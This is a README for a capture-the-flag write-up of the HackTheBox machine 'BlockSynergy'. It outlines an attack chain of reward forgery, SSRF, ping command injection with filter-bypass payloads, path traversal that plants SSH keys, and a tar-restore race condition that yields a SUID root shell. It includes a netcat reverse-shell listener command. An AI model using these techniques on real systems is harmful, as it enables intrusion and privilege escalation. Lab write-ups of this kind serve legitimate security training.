# BlockSynergy — HackTheBox

Linux (tournament / Insane). Attack path: **forged blockchain reward → VIP SSRF → `ping` command injection → contract `log_file` path traversal (hank) → restore-daemon TOCTOU → SUID bash**.

| | |
|--|--|
| **OS** | Ubuntu 24.04, Flask/Werkzeug 3.1.3 on `:8080`, OpenSSH `:22` |
| **Entry** | Public Flask “BlockSynergy” wallet / blockchain |
| **Foothold** | `walter` via `os.system("ping -w 4 " + userinfo)` (localhost admin) |
| **User (lateral)** | `hank` (`developers`) via internal contract engine `:5000` |
| **Root** | Root restore daemon, SHA256 then `tar xvf` TOCTOU |

Full write-up (PL, mechanizmy): [`WRITEUP.md`](WRITEUP.md)  
Scripts: [`scripts/`](scripts/)

No flags, VPN configs, or live keys in this tree.

---

## Lab setup

```bash
python3 scripts/exploit.py <TARGET_IP> <TUN0_IP> 4444
# listener on Kali:
nc -lvnp 4444
```

External surface is **22 and 8080 only**. Internal Flask on **`127.0.0.1:5000`** is not reachable from Kali.

---

## Attack chain (overview)

```text
┌──────────────────────┐  forge sender=Blockchain_Reward
│ Flask :8080          │ ── mine 5 TX (FIFO / our txs first) ──► ≥10 coins
└──────────┬───────────┘
           │ VIP node register
           ▼
┌──────────────────────┐  filter blocks 127/localhost; 0.0.0.0 bypass
│ test_node = GET      │ ── node B = /admin/nodes/manage?action=ping_node&target=A
└──────────┬───────────┘
           │ userinfo of A in ping -w 4 … ;  ${IFS} ; hex\|xxd\|sh
           ▼
┌──────────────────────┐
│ walter               │ ── POST upload_contract + claim on 127.0.0.1:5000
└──────────┬───────────┘
           │ __meta__.log_file path traversal → hank authorized_keys
           ▼
┌──────────────────────┐  group developers; rwx /opt/blocksynergy + /var/restore_work
│ hank                 │ ── touch restore; inotify IN_CLOSE_NOWRITE; rename tar
└──────────┬───────────┘
           │ root tar xvf -C /  extracts SUID bash as /opt/blocksynergy/.diag
           ▼
┌──────────────────────┐
│ root                 │  .diag -p
└──────────────────────┘
```

---

## Scripts

| Script | Purpose |
|--------|---------|
| [`scripts/exploit.py`](scripts/exploit.py) | Wallet → mine → VIP → SSRF ping-CI → reverse shell as `walter` |
| [`scripts/plant_hank.py`](scripts/plant_hank.py) | Emit `contract.json` for `:5000` `log_file` write (run curls on the box) |
| [`scripts/make_suid_tar.sh`](scripts/make_suid_tar.sh) | Pack `/bin/bash` as `opt/blocksynergy/.diag` mode 4755 |
| [`scripts/race_watcher.py`](scripts/race_watcher.py) | inotify swap of `_opt_blocksynergy.tar.gz` after sha256 close |
| [`scripts/README.md`](scripts/README.md) | How to run, constraints, gotchas |

Placeholders: `<TARGET_IP>`, `<TUN0_IP>`. Educational / HTB lab only.
